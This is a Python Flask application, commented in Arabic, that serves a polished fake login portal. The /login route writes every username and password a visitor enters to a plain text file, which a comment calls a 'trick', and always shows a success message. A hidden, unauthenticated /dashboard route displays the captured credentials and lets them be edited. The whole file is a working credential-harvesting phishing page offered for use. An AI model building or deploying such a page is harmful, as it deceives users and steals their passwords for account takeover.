import os
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# اسم الملف الذي ستُحفظ فيه البيانات سرياً
DATA_FILE = "saved_credentials.txt"

# للتوضيح: إذا لم يكن الملف موجوداً، سننشئه ونضع فيه قيم افتراضية
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        f.write("admin|123456")

# الواجهة الأمامية (صفحة تسجيل الدخول + لوحة التحكم السرية)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background: linear-gradient(135deg, #0f172a, #1e293b); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #f8fafc; padding: 20px; }
        .card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; width: 100%; max-width: 450px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
        h2 { margin-bottom: 25px; font-size: 26px; color: #38bdf8; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
        input { width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: 0.3s; text-align: right; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 8px rgba(56, 189, 248, 0.4); }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #0284c7, #0369a1); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
        .btn:hover { background: linear-gradient(135deg, #0ea5e9, #0284c7); transform: translateY(-1px); }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); }
        .btn-danger:hover { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .box { padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 14px; text-align: right; }
        .success-box { background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; color: #34d399; }
        .info-box { background: rgba(56, 189, 248, 0.1); border: 1px solid #38bdf8; color: #38bdf8; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="card">
        {% if mode == 'login' %}
            <h2>بوابة تسجيل الدخول</h2>
            {% if success %}
                <div class="box success-box" style="text-align: center;">
                    تم تسجيل الدخول بنجاح! مرحباً بك.
                </div>
                <br>
                <a href="/" style="color: #38bdf8; text-decoration: none;">خروج</a>
            {% else %}
                <form action="/login" method="POST">
                    <div class="form-group">
                        <label for="username">اسم المستخدم</label>
                        <input type="text" id="username" name="username" required autocomplete="off">
                    </div>
                    <div class="form-group">
                        <label for="password">كلمة المرور</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn">دخول</button>
                </form>
            {% endif %}

        {% elif mode == 'dashboard' %}
            <h2>لوحة التحكم السرية ⚙️</h2>
            <div class="box info-box">
                <strong>البيانات المحفوظة حالياً في السيرفر:</strong><br>
                اسم المستخدم الحالي: <span style="color: #fff;">{{ current_user }}</span><br>
                كلمة المرور الحالية: <span style="color: #fff;">{{ current_pass }}</span>
            </div>

            <hr style="border: 0; border-top: 1px solid #334155; margin: 20px 0;">

            <form action="/update" method="POST">
                <h3 style="font-size: 18px; margin-bottom: 15px; color: #fbbf24;">تعديل البيانات المحفوظة:</h3>
                <div class="form-group">
                    <label>اسم المستخدم الجديد</label>
                    <input type="text" name="new_username" value="{{ current_user }}" required>
                </div>
                <div class="form-group">
                    <label>كلمة المرور الجديدة</label>
                    <input type="text" name="new_password" value="{{ current_pass }}" required>
                </div>
                <button type="submit" class="btn">حفظ التعديلات الجديدة</button>
            </form>
            <br>
            <a href="/" style="color: #94a3b8; text-decoration: none; font-size: 14px;">العودة لصفحة الدخول</a>
        {% endif %}
    </div>

</body>
</html>
"""

# دالة مساعدة لقراءة البيانات من الملف النصي
def read_credentials():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip().split("|")
            if len(content) == 2:
                return content[0], content[1]
    except:
        pass
    return "admin", "123456"

# دالة مساعدة لحفظ البيانات الجديدة في الملف النصي
def write_credentials(user, password):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        f.write(f"{user}|{password}")

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, mode='login', success=False)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # حفظ البيانات التي أدخلها المستخدم فوراً في الملف النصي كـ "خدعة" للحفظ تلقائياً
    write_credentials(username, password)
    
    # عرض صفحة النجاح للمستخدم
    return render_template_string(HTML_TEMPLATE, mode='login', success=True)

# 🌐 الرابط السري لرؤية وتعديل البيانات
@app.route('/dashboard')
def dashboard():
    current_user, current_pass = read_credentials()
    return render_template_string(HTML_TEMPLATE, mode='dashboard', current_user=current_user, current_pass=current_pass)

# استقبال التعديلات من لوحة التحكم وحفظها
@app.route('/update', methods=['POST'])
def update():
    new_user = request.form.get('new_username')
    new_pass = request.form.get('new_password')
    write_credentials(new_user, new_pass)
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
